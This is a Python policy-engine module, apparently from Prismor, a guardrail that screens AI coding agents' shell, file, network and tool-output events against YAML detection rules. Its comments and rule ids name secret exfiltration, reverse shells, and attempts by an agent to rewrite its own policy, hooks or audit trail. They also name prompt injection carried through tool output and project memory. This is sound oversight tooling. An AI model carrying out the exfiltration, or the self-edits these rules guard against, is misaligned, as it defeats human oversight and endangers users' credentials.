"""YAML-based policy engine for Prismor.

Loads detection rules from default_policy.yaml, merges with project-level
overrides from .prismor/policy.yaml, compiles regex patterns, and
evaluates events. Replaces the hardcoded patterns in policies.py.
"""
from __future__ import annotations

import ast
import json
import os
import re
import shlex
import sys
import unicodedata
from pathlib import Path
from typing import Iterable, Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse

from prismor.runtime.egress import EgressPolicy
from prismor.runtime.data_boundary import DataBoundaryPolicy

try:
    import yaml
except ImportError:
    sys.stderr.write(
        "\n"
        "FATAL: PyYAML is required but not installed.\n"
        "  The policy engine cannot load any rules without it.\n"
        "  All security checks will be non-functional.\n"
        "\n"
        "  Install with:  pip3 install pyyaml\n"
        "           or:   apt-get install python3-yaml\n"
        "\n"
    )
    raise SystemExit(1)


_DEFAULT_POLICY_PATH = Path(__file__).parent / "default_policy.yaml"

# Rules that cannot be disabled or weakened by project-level policy overrides.
# These protect against the most dangerous attack patterns (destructive commands,
# credential exfiltration, reverse shells) and against disabling Prismor itself.
# A project-level .prismor/policy.yaml that tries to set enabled: false
# on any of these rule IDs will be ignored with a warning.
_NON_OVERRIDABLE_RULE_IDS = frozenset({
    "destructive-command",
    "secret-exfiltration",
    "rce-canary",
    "privilege-escalation",
    "dos-resource-exhaustion",
    # The signed audit trail is evidence — a policy override that disables
    # this rule would let an agent erase its own history undetected.
    "audit-trail-tampering",
    "tool-category-crossover",
    # An override that disables memory-integrity checking would let a
    # poisoned .prismor/policy.yaml also disable detection of itself.
    # See FIX_PLAN.md §3.5.
    "memory-integrity-mismatch",
    # Self-protection rules; see _SELF_PROTECTION_RULE_IDS below. Listed here so
    # no overlay can disable or weaken them, and listed there so the opt-in
    # floor of an explicit-selection policy cannot leave them observing.
    # (Keep apostrophes out of comments inside this literal: prismor-web
    # generates its copy of the floor by parsing this frozenset, and a quote
    # character splits the parse — see scripts/generate-default-policy-rules.js.)
    "agent-config-tampering",
    "agent-config-tampering-path",
    "prismor-self-edit",
})

# Categories that must stay in settings.block_categories no matter what an
# override layer says. Without this clamp, an override that *replaces* the
# block_categories list could silently downgrade core protections from block
# to observe even with every core rule still "enabled".
_CORE_BLOCK_CATEGORIES = frozenset({
    "destructive_command",
    "secret_exfiltration",
    "remote_execution",
    "rce_canary",
    "privilege_escalation",
    "dos_resource_exhaustion",
    "lethal_trifecta",
})

# Rules by which Prismor guards *itself*: its hook wiring, its policy files,
# its audit trail, and the credential/grant that gate agent self-edit. These
# always enforce — they are not a policy choice about what the agent may do to
# the machine, they are what keeps every other choice honest. In particular
# they are exempt from the opt-in floor of an explicit-selection policy
# (settings.selection: explicit), because a selection screen that let the user
# switch off "the agent may not rewrite its own policy" would make every other
# selection on that screen meaningless.
#
# The one thing that lifts them is a password-verified unlock window
# (prismor unlock — see runtime/unlock.py), checked at dispatch, never here.
_SELF_PROTECTION_RULE_IDS = frozenset({
    "agent-config-tampering",
    "agent-config-tampering-path",
    "prismor-self-edit",
    "audit-trail-tampering",
    "memory-integrity-mismatch",
})

# Self-protection rules whose jurisdiction is strictly THIS machine: they guard
# Prismor's own policy file, unlock credential, and the agent hook config. When
# one of them matches inside an ssh/docker/kubectl payload, the thing being
# edited is a different install with its own policy, so the finding is reported
# but not blocked. See shell_context.is_remote_payload (issue #344).
#
# Not a floor constant and deliberately not parsed by prismor-web: it narrows
# nothing an overlay can reach, it only decides local-vs-remote for a match that
# already fired.
_LOCAL_JURISDICTION_RULE_IDS = frozenset({
    "prismor-self-edit",
    "agent-config-tampering",
    "agent-config-tampering-path",
})

# Canonical field for each event type when 'fields' is not specified in the rule.
_DEFAULT_FIELDS: Dict[str, List[str]] = {
    "shell": ["command"],
    "file_read": ["path"],
    "file_write": ["path"],
    "network": ["url"],
    "prompt": ["combined_text"],
    "tool_result": ["combined_text"],
    # Project-memory files (CLAUDE.md/AGENTS.md) auto-loaded at session start.
    # Their directives are untrusted the same way tool output is, so they match
    # against the same combined_text field. See issue #155.
    "memory": ["combined_text"],
    "skill_manifest": ["combined_text"],
    # Charter (prompt/description) handed to a spawned subagent. Untrusted
    # instruction text that will drive an autonomous agent, so it is scanned
    # like tool output — see _UNTRUSTED_CONTENT_ALIASES below.
    "subagent_spawn": ["combined_text"],
    # Synthetic type for ad-hoc validation of arbitrary agent I/O
    # (PolicyEngine.check_text / `prismor check --type text`). It has no rules
    # of its own; evaluate() routes it through the agent-I/O content rules.
    # See PrismorSec/prismor#163.
    "text": ["combined_text"],
    # A GUI agent operating an on-screen control (click, key press, typing).
    # The canonical field is the control's accessibility label because that is
    # what names the act — "Send", "Buy now", "Delete account". The role
    # (ax_role), owning app (app_name) and text about to be committed
    # (typed_text) are matchable but secondary: a rule that matches on the role
    # catches a password box whatever it is labelled, and one that matches on
    # the app catches a whole surface, but neither answers "what does pressing
    # this do?", which is the question a GUI guardrail is asking.
    "ui_action": ["control_label"],
}

# Default field(s) checked by a rule that opts in via the `mcp` event-type
# alias (event_types: [mcp]) without naming its own `fields`. Matching on the
# full `mcp__server__tool` tag is the common case ("block/approve calls to this
# MCP tool"); rules wanting to inspect arguments name fields explicitly
# (outbound_payload for remote servers, response for local stdio).
_MCP_ALIAS_DEFAULT_FIELDS: List[str] = ["tool_name"]

# Rule event-types a synthetic "text" check is evaluated against.
_TEXT_CONTENT_TYPES = frozenset({"prompt", "tool_result"})

# Event sources whose content is untrusted and must be scrutinized by every
# content rule that scrutinizes tool output. `memory` (CLAUDE.md/AGENTS.md,
# loaded at session start) is folded in here so no rule can silently exempt the
# project-memory source from block-category evaluation (issue #155).
_UNTRUSTED_CONTENT_ALIASES: Dict[str, set[str]] = {
    "tool_result": {"memory", "subagent_spawn"},
}

# Human-readable provenance tag attached to each finding, so telemetry and the
# dashboard can attribute an action to where its authorizing instruction came
# from (live user turn, untrusted tool output, or project memory). Issue #155.
_EVENT_SOURCE: Dict[str, str] = {
    "prompt": "user_prompt",
    "tool_result": "tool_output",
    "memory": "project_memory",
    "memory_integrity": "memory_integrity",
}

# Provenance stamped on a finding raised from the body of a script the agent
# executes, rather than from the command text itself (PrismorSec/prismor#27).
_SCRIPT_SOURCE = "executed_script"


def is_floor_protected_rule(
    rule_id: str,
    default_rule: Optional[Dict[str, Any]] = None,
) -> bool:
    """Return whether a rule is part of Prismor's non-disableable safety floor.

    The floor is keyed both by explicit rule id and by core block category so
    newly-added core rules inherit the protection even if their ids have not
    yet been hand-listed.
    """
    return rule_id in _NON_OVERRIDABLE_RULE_IDS or (
        default_rule is not None
        and default_rule.get("category") in _CORE_BLOCK_CATEGORIES
    )


def is_self_protection_rule(rule_id: str) -> bool:
    """Return whether a rule is one by which Prismor guards itself.

    These are the rules an explicit-selection policy may not leave in observe,
    and that `prismor allow` refuses to touch even inside an unlock window.
    """
    return rule_id in _SELF_PROTECTION_RULE_IDS


class _TaintStore:
    """Per-session taint state persisted across hook invocations.

    Tracks whether a prompt injection was detected in the current session
    so that subsequent network calls can be escalated to CRITICAL regardless
    of their destination. Stored in Prismor's central workspace state dir.
    """

    def __init__(self, workspace: Path, session_id: str) -> None:
        safe = "".join(
            c if c.isalnum() or c in "._-" else "_" for c in session_id
        )
        from prismor.runtime.store import get_data_dir

        self._path = get_data_dir(workspace) / "taint" / f"{safe}.json"
        self.injection_detected: bool = False
        self.injection_event_index: Optional[int] = None
        self.seen_domains: set = set()
        # Doc/skill provenance: every external instruction source this session
        # loaded ({kind, ref, host, index}), and every binary it installed. Used
        # to annotate and (one rung) escalate data-boundary findings — see
        # data_boundary.DataBoundaryPolicy.evaluate. Append-only like the rest.
        self.sources: list = []
        self.installed: set = set()
        self._load()

    def _load(self) -> None:
        if not self._path.exists():
            return
        try:
            data = json.loads(self._path.read_text(encoding="utf-8"))
            self.injection_detected = bool(data.get("injection_detected", False))
            self.injection_event_index = data.get("injection_event_index")
            self.seen_domains = set(data.get("seen_domains", []))
            self.sources = [x for x in data.get("sources", []) if isinstance(x, dict)]
            self.installed = set(data.get("installed", []))
        except Exception:
            pass

    def _update(self, **fields: Any) -> None:
        """Merge ``fields`` into the session's taint file under an exclusive lock.

        Taint is monotonic — it is only ever set, never cleared — so merging
        with OR/union semantics is safe under concurrency and never resurrects
        state a writer intended to drop. Concurrent subagents write this file
        from separate processes; an unlocked read-modify-write silently drops
        an injection flag, which is a fail-open.
        """
        from prismor.runtime.store import locked_json_update

        try:
            with locked_json_update(self._path) as state:
                if fields.get("injection_detected"):
                    state["injection_detected"] = True
                    index = fields.get("injection_event_index")
                    prior = state.get("injection_event_index")
                    if isinstance(index, int) and (
                        not isinstance(prior, int) or index < prior
                    ):
                        state["injection_event_index"] = index
                domain = fields.get("domain")
                if domain:
                    domains = state.get("seen_domains")
                    if not isinstance(domains, list):
                        domains = []
                    if domain not in domains:
                        domains.append(domain)
                    state["seen_domains"] = sorted(domains)
                source = fields.get("source")
                if isinstance(source, dict):
                    sources = state.get("sources")
                    if not isinstance(sources, list):
                        sources = []
                    sources.append(source)
                    state["sources"] = sources[-50:]
                installed = fields.get("installed")
                if installed:
                    have = state.get("installed")
                    if not isinstance(have, list):
                        have = []
                    state["installed"] = sorted(set(have) | set(installed))
        except Exception:
            # Never break the tool call being screened over a taint write.
            pass

    def mark_injection(self, event_index: int) -> None:
        self.injection_detected = True
        self.injection_event_index = event_index
        self._update(injection_detected=True, injection_event_index=event_index)

    def add_domain(self, domain: str) -> None:
        self.seen_domains.add(domain.lower())
        self._update(domain=domain.lower())

    def is_new_domain(self, domain: str) -> bool:
        return domain.lower() not in self.seen_domains

    def add_source(self, kind: str, ref: str, host: str, event_index: int) -> None:
        src = {"kind": kind, "ref": ref[:300], "host": (host or "").lower(), "index": event_index}
        self.sources.append(src)
        self._update(source=src)

    def add_installed(self, names: Iterable[str]) -> None:
        names = {str(n).lower() for n in names if n}
        if not names:
            return
        self.installed |= names
        self._update(installed=sorted(names))

    def latest_source(self, event_index: int, window: int = 25) -> Optional[Dict[str, Any]]:
        """Freshest doc/skill source within ``window`` events, or None (decayed)."""
        for src in reversed(self.sources):
            idx = src.get("index")
            if isinstance(idx, int) and event_index - idx > window:
                return None
            return src
        return None


class InMemoryTaintStore:
    """Session taint held in memory for the life of one evaluation batch.

    Same surface as :class:`_TaintStore`, minus the disk. Exists for callers
    that have no local box to persist to and instead reconstruct the session by
    replaying its history in one pass — the hosted inference-hook channel, where
    the full transcript is re-sent every turn (see ``inference_hook.py``).
    Instantiate one per request and share it across the fanned events so an
    injection found in an earlier ``tool_result`` still escalates a later
    ``network`` event, exactly as the on-disk store would across hook calls.

    Deliberately not a subclass: ``_TaintStore.__init__`` resolves a data dir
    and reads a file, which is precisely what this avoids.
    """

    def __init__(self) -> None:
        self.injection_detected: bool = False
        self.injection_event_index: Optional[int] = None
        self.seen_domains: set = set()

    def mark_injection(self, event_index: int) -> None:
        self.injection_detected = True
        # Monotonic + earliest-wins, matching the persistent store: taint is
        # only ever set, and the index points at the first poisoned event.
        if not isinstance(self.injection_event_index, int) or event_index < self.injection_event_index:
            self.injection_event_index = event_index

    def add_domain(self, domain: str) -> None:
        self.seen_domains.add(domain.lower())

    def is_new_domain(self, domain: str) -> bool:
        return domain.lower() not in self.seen_domains


def _check_cloaked_secrets_in_text(text: str) -> Optional[str]:
    """Check whether any enrolled cloaking secret appears verbatim in ``text``.

    Returns the secret *name* (never the value) if a match is found,
    or ``None`` if nothing matches or the secrets store is unavailable.
    Secrets shorter than 8 characters are skipped to avoid false positives
    on common short strings.
    """
    if not text:
        return None
    try:
        from prismor.runtime.cloaking.secrets_store import secrets_dir
        sdir = secrets_dir()
        if not sdir.exists():
            return None
        for secret_file in sorted(sdir.iterdir()):
            if not secret_file.is_file():
                continue
            try:
                value = secret_file.read_text(encoding="utf-8").strip()
                if value and len(value) >= 8 and value in text:
                    return secret_file.name
            except Exception:
                continue
    except Exception:
        pass
    return None


# Backwards-compatible alias — the URL is just one kind of outbound text.
def _check_cloaked_secrets_in_url(url: str) -> Optional[str]:
    return _check_cloaked_secrets_in_text(url)


_QUANT_ANY_RE = re.compile(r'\bany\s+of\s*\(', re.IGNORECASE)
_QUANT_ALL_RE = re.compile(r'\ball\s+of\s*\(', re.IGNORECASE)
_QUANT_N_RE = re.compile(r'\b(\d+)\s+of\s*\(', re.IGNORECASE)
_ALLOWED_CONDITION_CALLS = frozenset({"any_of", "all_of", "n_of"})


class ConditionError(ValueError):
    """Raised when a rule's `condition:` expression is malformed."""


class RuleCondition:
    """A boolean expression over a rule's named pattern groups.

    Grammar (a deliberately small subset — `and`, `or`, `not`, parentheses,
    and counting quantifiers)::

        condition: "patterns and not benign_context"
        condition: "exfil_verb and (secret_ref or credential_ref)"
        condition: "2 of (curl_use, env_read, base64_encode)"
        condition: "any of (aws_key, gcp_key) and not test_fixture"

    Parsed once at rule-compile time into a validated AST and evaluated per
    event against a {group_name: bool} map. Python's `eval` is never used and
    the node whitelist rejects anything that is not boolean logic, so a policy
    file — including a signed org overlay — cannot smuggle in code execution.
    """

    __slots__ = ("source", "_tree", "groups")

    def __init__(self, source: str, known_groups: set) -> None:
        self.source = source
        # Rewrite the human-friendly quantifiers into ordinary call syntax so
        # the stdlib parser can do the heavy lifting.
        expr = _QUANT_ANY_RE.sub("any_of(", source)
        expr = _QUANT_ALL_RE.sub("all_of(", expr)
        expr = _QUANT_N_RE.sub(lambda m: f"n_of({m.group(1)}, ", expr)
        try:
            self._tree = ast.parse(expr, mode="eval").body
        except SyntaxError as exc:
            raise ConditionError(f"invalid condition {source!r}: {exc.msg}") from exc
        self.groups: set = set()
        self._validate(self._tree, known_groups)
        if not self.groups:
            raise ConditionError(f"condition {source!r} references no pattern groups")

    def _validate(self, node, known_groups: set) -> None:
        if isinstance(node, ast.BoolOp) and isinstance(node.op, (ast.And, ast.Or)):
            for value in node.values:
                self._validate(value, known_groups)
            return
        if isinstance(node, ast.UnaryOp) and isinstance(node.op, ast.Not):
            self._validate(node.operand, known_groups)
            return
        if isinstance(node, ast.Name):
            if node.id not in known_groups:
                raise ConditionError(
                    f"condition {self.source!r} references unknown group '{node.id}' "
                    f"(defined: {', '.join(sorted(known_groups)) or 'none'})")
            self.groups.add(node.id)
            return
        if isinstance(node, ast.Call):
            fname = getattr(node.func, "id", None)
            if fname not in _ALLOWED_CONDITION_CALLS or node.keywords:
                raise ConditionError(f"condition {self.source!r}: unsupported call")
            args = node.args
            if fname == "n_of":
                if not args or not isinstance(args[0], ast.Constant) or not isinstance(args[0].value, int):
                    raise ConditionError(f"condition {self.source!r}: 'N of (...)' needs an integer count")
                args = args[1:]
            if not args:
                raise ConditionError(f"condition {self.source!r}: quantifier needs at least one group")
            for arg in args:
                self._validate(arg, known_groups)
            return
        raise ConditionError(
            f"condition {self.source!r}: only and/or/not, parentheses and "
            f"'N of (...)' quantifiers are allowed")

    def evaluate(self, matched: Dict[str, bool]) -> bool:
        return self._eval(self._tree, matched)

    def _eval(self, node, matched: Dict[str, bool]) -> bool:
        if isinstance(node, ast.BoolOp):
            values = (self._eval(v, matched) for v in node.values)
            return all(values) if isinstance(node.op, ast.And) else any(values)
        if isinstance(node, ast.UnaryOp):
            return not self._eval(node.operand, matched)
        if isinstance(node, ast.Name):
            return bool(matched.get(node.id, False))
        # Call — validated to be one of the three quantifiers.
        fname = node.func.id
        if fname == "n_of":
            need = node.args[0].value
            args = node.args[1:]
        else:
            need = None
            args = node.args
        hits = sum(1 for a in args if self._eval(a, matched))
        if fname == "any_of":
            return hits > 0
        if fname == "all_of":
            return hits == len(args)
        return hits >= need


class CompiledRule:
    """A single policy rule with compiled regex patterns."""

    __slots__ = (
        "id", "severity", "category", "title", "event_types",
        "fields", "patterns", "raw_patterns", "action", "enabled", "mode",
        "transform",
        "severity_on_write", "severity_on_manifest",
        "pattern_groups", "condition",
    )

    def __init__(self, raw: Dict[str, Any]) -> None:
        self.id: str = raw["id"]
        self.severity: str = raw["severity"]
        self.category: str = raw["category"]
        self.title: str = raw["title"]
        self.event_types: set[str] = set(raw["event_types"])
        # #155: don't special-case the source at the point an action is
        # authorized. A rule that treats tool-output content as untrusted must
        # treat project-memory content (CLAUDE.md/AGENTS.md) the same way. Doing
        # this at load time — rather than per-rule in YAML — makes it a
        # structural invariant: no current or future block-category rule can
        # silently exempt the project-memory source.
        for base_type, aliases in _UNTRUSTED_CONTENT_ALIASES.items():
            if base_type in self.event_types:
                self.event_types |= aliases
        self.fields: List[str] = raw.get("fields") or []
        self.action: str = raw.get("action", "warn")
        # Named transform for action: modify (R4 MODIFY). Empty for other
        # actions; the hook dispatcher rewrites tool input via this name.
        self.transform: str = raw.get("transform", "")
        self.enabled: bool = raw.get("enabled", True)
        # Per-rule observe/enforce override. None = inherit settings.default_mode
        # (which itself defaults to "observe"). enforce = this rule blocks on a
        # pre-action event; observe = detect + log only. This — not `action` or
        # block_categories — is the authoritative enforce lever.
        _m = raw.get("mode")
        self.mode: Optional[str] = str(_m).lower() if _m else None
        self.severity_on_write: Optional[str] = raw.get("severity_on_write")
        self.severity_on_manifest: Optional[str] = raw.get("severity_on_manifest")

        # Effective pattern set = default patterns MINUS any the admin disabled,
        # PLUS any custom patterns they added. `disable_patterns` references a
        # default by its EXACT regex string (a stale/no-match entry is simply
        # ignored, so drift always fails toward MORE detection, never less).
        # `add_patterns` lets an org strengthen a rule without forking the whole
        # patterns list. Order-stable + de-duplicated: surviving defaults first.
        base: List[str] = [str(p) for p in raw["patterns"]]
        disable_set = {str(p) for p in (raw.get("disable_patterns") or [])}
        adds = [str(p) for p in (raw.get("add_patterns") or []) if isinstance(p, str) and p]
        effective: List[str] = []
        seen: set[str] = set()
        for p in base:
            if p in disable_set or p in seen:
                continue
            # Every default already compiles; keep it.
            effective.append(p); seen.add(p)
        for a in adds:
            if a in seen:
                continue
            # Compile each custom pattern in isolation so one typo can't take down
            # the rule's real detection — a bad add is dropped with a warning.
            try:
                re.compile(a)
            except re.error as exc:
                sys.stderr.write(f"[prismor] rule '{self.id}': ignoring invalid custom pattern ({exc})\n")
                continue
            effective.append(a); seen.add(a)
        if not effective:
            # A rule must never compile to an empty alternation (that silently
            # matches nothing). Fall back to the full default set + warn — the
            # control plane separately blocks saving a non-core rule to zero.
            sys.stderr.write(f"[prismor] rule '{self.id}': no active patterns after customization — restoring defaults\n")
            effective = list(base)

        # Compile into a single alternation for speed. DOTALL so . matches
        # newlines — prevents evasion via embedded newlines. The individual
        # pattern strings are kept so a finding can report which one fired.
        self.raw_patterns: List[str] = effective
        joined = "|".join(f"(?:{p})" for p in effective)
        self.patterns: re.Pattern[str] = re.compile(
            joined, re.IGNORECASE | re.DOTALL
        )

        # ── Optional named groups + boolean condition ────────────────────
        # Absent `condition:` => self.condition stays None and matching takes
        # the flat any-pattern-wins path above, byte-for-byte as before. Only a
        # rule that opts in pays for any of this.
        self.pattern_groups: Dict[str, re.Pattern[str]] = {}
        self.condition: Optional[RuleCondition] = None
        raw_condition = raw.get("condition")
        if raw_condition:
            # A condition can only ever NARROW when a rule fires, so allowing it
            # on a floor-protected rule would hand overlays the rule-disabling
            # power the floor exists to deny (`condition: "patterns and never"`).
            # Refuse it there rather than silently accepting a weakened core rule.
            if self.id in _NON_OVERRIDABLE_RULE_IDS or self.category in _CORE_BLOCK_CATEGORIES:
                sys.stderr.write(
                    f"[prismor] rule '{self.id}': `condition` ignored — core rules "
                    f"cannot be narrowed by a condition expression\n")
            else:
                groups: Dict[str, re.Pattern[str]] = {}
                for gname, gpats in (raw.get("pattern_groups") or {}).items():
                    plist = [str(p) for p in (gpats or []) if str(p)]
                    if not plist:
                        continue
                    try:
                        groups[str(gname)] = re.compile(
                            "|".join(f"(?:{p})" for p in plist), re.IGNORECASE | re.DOTALL)
                    except re.error as exc:
                        sys.stderr.write(
                            f"[prismor] rule '{self.id}': ignoring invalid pattern group "
                            f"'{gname}' ({exc})\n")
                # The rule's own `patterns:` is always addressable as `patterns`,
                # so the common case — keep the detection, subtract a known
                # false positive — needs no restructuring of the existing rule.
                groups.setdefault("patterns", self.patterns)
                try:
                    self.condition = RuleCondition(str(raw_condition), set(groups))
                    self.pattern_groups = groups
                except ConditionError as exc:
                    # Fail toward MORE detection: drop the condition, keep the
                    # flat alternation. A typo must never silently disable a rule.
                    sys.stderr.write(f"[prismor] rule '{self.id}': {exc} — condition ignored\n")

    def evaluate_condition(self, values: List[str]) -> Optional[str]:
        """Evaluate this rule's condition across ``values`` (the checked fields).

        A group counts as matched if it matches ANY checked field. Returns the
        field value to report as evidence when the condition holds, else None.
        """
        matched: Dict[str, bool] = {}
        evidence: Optional[str] = None
        for gname, gpat in self.pattern_groups.items():
            for value in values:
                if value and gpat.search(value):
                    matched[gname] = True
                    if evidence is None:
                        evidence = value
                    break
            else:
                matched[gname] = False
        if not self.condition.evaluate(matched):
            return None
        # A condition that holds purely through negation ("not benign") has no
        # positive match to quote; fall back to the first non-empty field.
        return evidence or next((v for v in values if v), "")

    def matched_pattern(self, value: str) -> Optional[str]:
        """Return the specific pattern that matches ``value``, if any.

        Only called on the (rare) match path — the hot path stays on the single
        pre-compiled alternation. Individual patterns are compiled lazily and
        cached by the ``re`` module.
        """
        for p in self.raw_patterns:
            try:
                if re.search(p, value, re.IGNORECASE | re.DOTALL):
                    return p
            except re.error:
                continue
        return None


class AllowlistEntry:
    """A compiled allowlist entry that suppresses findings.

    ``type: veto`` inverts the entry: instead of suppressing the finding it
    disqualifies every allowlist from suppressing it. An allowlist broad enough
    to be useful is broad enough to over-grant — "address bar" also reads on
    "Email address" — and the only safe way to carve that back was previously to
    make the allowlist pattern itself narrower and more brittle. A veto keeps the
    exception readable and states the carve-out as its own auditable entry.
    ``type`` is a field on the existing entry rather than a new top-level
    section because a veto is scoped by ``rule_ids`` and matched by ``patterns``
    exactly like an allow, and reusing the shape keeps both halves of a
    carve-out visible in the same list.
    """

    __slots__ = ("id", "rule_ids", "patterns", "raw_patterns", "reason", "type", "expires")

    def __init__(self, raw: Dict[str, Any]) -> None:
        self.id: str = raw["id"]
        self.rule_ids: set[str] = set(raw["rule_ids"])
        self.reason: str = raw.get("reason", "")
        # Optional ISO-8601 expiry, so a "just this once" exception written by
        # `prismor allow --expires` lapses on its own instead of quietly
        # becoming permanent policy.
        _exp = raw.get("expires")
        self.expires: Optional[str] = str(_exp) if _exp else None
        # Absent means allow, so every pre-existing entry keeps its behaviour.
        _t = str(raw.get("type", "allow")).lower()
        self.type: str = _t if _t in ("allow", "veto") else "allow"
        self.raw_patterns: List[str] = [str(p) for p in raw["patterns"]]
        joined = "|".join(f"(?:{p})" for p in raw["patterns"])
        self.patterns: re.Pattern[str] = re.compile(joined, re.IGNORECASE)

    def applies_to(self, rule_id: str) -> bool:
        if self.expires and self.expires < _now_iso_z():
            return False
        return "*" in self.rule_ids or rule_id in self.rule_ids


class PolicyEngine:
    """Loads, merges, and evaluates YAML-based security policies."""

    def __init__(
        self,
        workspace: Optional[Path] = None,
        policy_path: Optional[Path] = None,
    ) -> None:
        self.workspace: Optional[Path] = workspace
        self.rules: List[CompiledRule] = []
        self.allowlists: List[AllowlistEntry] = []
        self.block_categories: set[str] = set()
        self._manifest_re: Optional[re.Pattern[str]] = None
        self.egress_allowlist = []
        self.egress: EgressPolicy = EgressPolicy()
        self.data_boundary: DataBoundaryPolicy = DataBoundaryPolicy()
        self._data_boundary_source: str = "default"
        # Which policy layer last set the egress config. "remote" means the org
        # signed it, which is what makes an enforce verdict authoritative.
        self._egress_source: str = "default"
        self.outputs: List[Dict[str, Any]] = []
        self.semantic_guard_config: Dict[str, Any] = {}
        self.sandbox_config: Dict[str, Any] = {}
        self._semantic_guard = None  # lazy-instantiated on first uncertain event
        # Optional caller-supplied taint store, used instead of the per-session
        # file. Set by stateless callers that reconstruct taint by replay
        # (see InMemoryTaintStore); None keeps the normal on-disk behaviour.
        self.taint_override: Optional[Any] = None
        self.remote_policy_meta: Dict[str, Any] = {}
        self._default_mode_explicit: bool = False
        # True when this policy names its blocking set rule by rule
        # (settings.selection: explicit, written by `prismor setup`) and that
        # choice is locally authoritative. See _resolve_mode.
        self.explicit_selection: bool = False
        self._load(workspace, policy_path)

    @property
    def is_legacy_policy(self) -> bool:
        """True for a policy that predates per-rule observe/enforce: it sets
        ``block_categories`` but never opts into the new model (no
        ``settings.default_mode``/``mode`` and no rule-level ``mode``).

        Such a policy keeps its original semantics through the enforce bridge in
        ``cli.py`` — its ``block_categories`` still block when installed with
        ``--mode enforce`` — so upgrading an existing install doesn't silently
        stop blocking. Any policy that adopts the per-rule model (sets a mode
        anywhere) is fully policy-authoritative and ignores this bridge.
        """
        return (
            bool(self.block_categories)
            and not self._default_mode_explicit
            and not any(r.mode for r in self.rules)
        )

    def _resolve_mode(self, rule: "CompiledRule") -> str:
        """Effective observe/enforce for a finding raised by ``rule``.

        Per-rule mode, else the policy's ``default_mode``; ``should_block()``
        blocks only on "enforce". Two exceptions sit above that:

        * **Self-protection** (``_SELF_PROTECTION_RULE_IDS``) always enforces.
          Nothing in a policy file can leave the agent free to rewrite Prismor's
          own wiring; only a password-verified unlock window lifts it, and that
          is applied at dispatch, not here.
        * **The safety floor** (core rule ids / core block categories) enforces
          regardless of ``default_mode`` — unless this policy declared
          ``settings.selection: explicit``, i.e. the operator chose their
          blocking set rule by rule in `prismor setup` and did not choose this
          one. That opt-in is honored only for a locally-authored policy on an
          unmanaged workspace (see ``self.explicit_selection``), so it can never
          downgrade an org-managed install.

        The floor only applies to rules whose action is "block"; a rule that
        explicitly declares action: "warn" is honored as a warning even inside a
        core category — otherwise a warn-intended rule silently hard-blocks.
        """
        if rule.id in _SELF_PROTECTION_RULE_IDS:
            return "enforce"
        if (
            rule.action == "block"
            and (rule.id in _NON_OVERRIDABLE_RULE_IDS or rule.category in _CORE_BLOCK_CATEGORIES)
            and not self.explicit_selection
        ):
            return "enforce"
        return self.device_mode or rule.mode or self.default_mode

    def _match_exemption(self, workspace: Optional[Path], settings: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Find an admin-granted, non-expired exemption matching this workspace's
        repo, from the signed bundle's ``settings.repo_exemptions``. Returns the
        exemption dict (with id/reason/overlay) or None."""
        if workspace is None:
            return None
        exemptions = settings.get("repo_exemptions")
        if not isinstance(exemptions, list) or not exemptions:
            return None
        try:
            from prismor.runtime.enterprise import workspace_scope as _scope
            remote = _scope.detect_git_remote(workspace)
        except Exception:
            remote = None
        if not remote:
            return None
        now_iso = _now_iso_z()
        for ex in exemptions:
            if not isinstance(ex, dict):
                continue
            pattern = str(ex.get("pattern", ""))
            expires = ex.get("expires")
            if expires and str(expires) < now_iso:
                continue  # expired — server should also drop it, but be safe
            try:
                from prismor.runtime.enterprise import workspace_scope as _scope
                if pattern and _scope._matches(remote, pattern):
                    return ex
            except Exception:
                continue
        return None

    def _apply_override(
        self,
        override_raw: Dict[str, Any],
        rules_by_id: Dict[str, Dict[str, Any]],
        allowlist_raw: List[Dict[str, Any]],
        settings: Dict[str, Any],
        source: str,
    ) -> None:
        """Merge one override layer (project or remote) into the working policy.

        Honors ``_NON_OVERRIDABLE_RULE_IDS`` for every layer: no override —
        local project *or* signed remote — may disable or weaken a core rule.
        Overrides may strengthen them (e.g. add patterns) and may freely add or
        replace non-core rules. Settings are merged key-by-key, so a later layer
        wins (remote is applied after project = org-admin authoritative).
        """
        for rule in override_raw.get("rules", []) or []:
            rule_id = rule.get("id", "")
            default = rules_by_id.get(rule_id)
            # A rule is floor-protected if its own id is hand-listed OR its
            # default category is one of the core block categories — matching
            # by category too closes the gap where a rule's category was added
            # to _CORE_BLOCK_CATEGORIES (protecting its finding `mode`) without
            # also adding its id to _NON_OVERRIDABLE_RULE_IDS (protecting
            # `enabled`/`patterns`/`action`), which let an override fully
            # disable "remote-execution" outright — see PrismorSec/prismor#140.
            _is_floor = is_floor_protected_rule(rule_id, default)
            if _is_floor:
                if not rule.get("enabled", True):
                    sys.stderr.write(
                        f"[prismor] Ignoring {source} override for non-overridable "
                        f"rule '{rule_id}' (cannot be disabled)\n"
                    )
                    continue
                if default:
                    merged = {**default, **rule}
                    merged["enabled"] = True  # force enabled
                    # Core protections are ADD-ONLY: their default patterns,
                    # action, and severity can never be replaced or weakened,
                    # only extended. Without restoring action/severity here, an
                    # override could leave the rule "enabled" with its original
                    # patterns but set action=allow/severity=LOW — should_block()
                    # is protected via the separate mode clamp below, but
                    # anything that reads the finding's action directly (e.g.
                    # `prismor check`'s exit code) would not be — see #141.
                    merged["patterns"] = default["patterns"]  # block full-replace neuter
                    merged["action"] = default["action"]
                    merged["severity"] = default["severity"]
                    if merged.pop("disable_patterns", None) is not None:
                        sys.stderr.write(
                            f"[prismor] Ignoring disable_patterns on core rule '{rule_id}' (cannot be weakened)\n"
                        )
                    # Union add_patterns across layers (strengthen-only), so a later
                    # layer can't silently drop an earlier layer's custom detections.
                    _adds = list(dict.fromkeys([*(default.get("add_patterns") or []), *(rule.get("add_patterns") or [])]))
                    if _adds:
                        merged["add_patterns"] = _adds
                    rules_by_id[rule_id] = merged
                    continue
            # Field-level merge so a sparse overlay (e.g. just {id, mode: enforce})
            # flips one field without dropping the rule's patterns/category. A full
            # overlay rule still fully overrides — every key it provides wins.
            existing = rules_by_id.get(rule["id"])
            if isinstance(existing, dict):
                merged = {**existing, **rule}
                # add_patterns/disable_patterns are UNIONED across layers (project
                # < remote < exemption), not last-writer-wins — otherwise a later
                # layer would silently wipe an earlier layer's custom patterns.
                for _k in ("add_patterns", "disable_patterns"):
                    _u = list(dict.fromkeys([*(existing.get(_k) or []), *(rule.get(_k) or [])]))
                    if _u:
                        merged[_k] = _u
                rules_by_id[rule["id"]] = merged
            else:
                # No existing rule with this id. Treat it as a brand-new rule only
